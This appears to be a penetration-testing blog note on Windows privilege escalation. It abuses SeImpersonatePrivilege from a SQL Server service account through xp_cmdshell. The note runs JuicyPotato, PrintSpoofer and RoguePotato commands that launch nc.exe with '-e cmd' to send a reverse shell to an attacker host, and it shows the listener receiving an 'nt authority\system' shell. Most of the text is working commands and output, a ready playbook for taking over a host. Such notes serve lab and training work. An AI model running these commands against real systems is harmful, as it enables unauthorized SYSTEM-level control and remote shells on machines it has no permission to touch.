---
title: SeImpersonate and SeAssignPrimaryToken
date: 2026-03-06 11:48:44
categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - User
---

> Sometimes services need to impersonate users to perform actions on their behalf, such as writing files to the system or accessing network shares. For this reason, administrators often grant service accounts the `SeImpersonatePrivilege`. As a result, whenever we gain a shell as a service account, it is always worth checking whether this privilege is present.

> Abusing `SeImpersonate` and `SeAssignPrimaryToken` consists of tricking a high-privileged process (usually running as `SYSTEM`) into authenticating to an attacker-controlled service (via Named Pipes, RPC, or COM). When this happens, Windows creates an access token for the connection. With `SeImpersonatePrivilege`, this token can be impersonated and duplicated. Using `SeAssignPrimaryTokenPrivilege` (or `SeImpersonatePrivilege`), a new process can then be spawned with it via functions such as `CreateProcessWithTokenW`, resulting in `SYSTEM`-level execution.

## Confirming Access

With this access, we can confirm that we are indeed running in the context of a SQL Server service account.

```bash
SQL> xp_cmdshell whoami

--------------------------------------------------------------------------------

nt service\mssql$sqlexpress01
```

## Checking Account Privileges

```bash
SQL> xp_cmdshell whoami /priv

----------------------
Privilege Name                Description                               State

============================= ========================================= ========

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

➜ So, we have `SeImpersonatePrivilege` privilege enabled,

## JuicyPotato

```bash
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe Our-Ip Our-listening-port -e cmd.exe" -t *
```

## PrintSpoofer

```bash
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe Our-Ip Our-listening-port -e cmd"
```

## RoguePotato

```plaintext
SQL> xp_cmdshell xp_cmdshell c:\tools\RoguePotato\RoguePotato.exe -r Our-Ip -l 53375 -e "c:\tools\nc.exe Our-Ip Our-listening-port -e cmd"
```

## Catching SYSTEM Shell

```bash
➜  windows-privsc rlwrap nc -lvnp 8443

C:\Windows\system32> whoami

nt authority\system
```
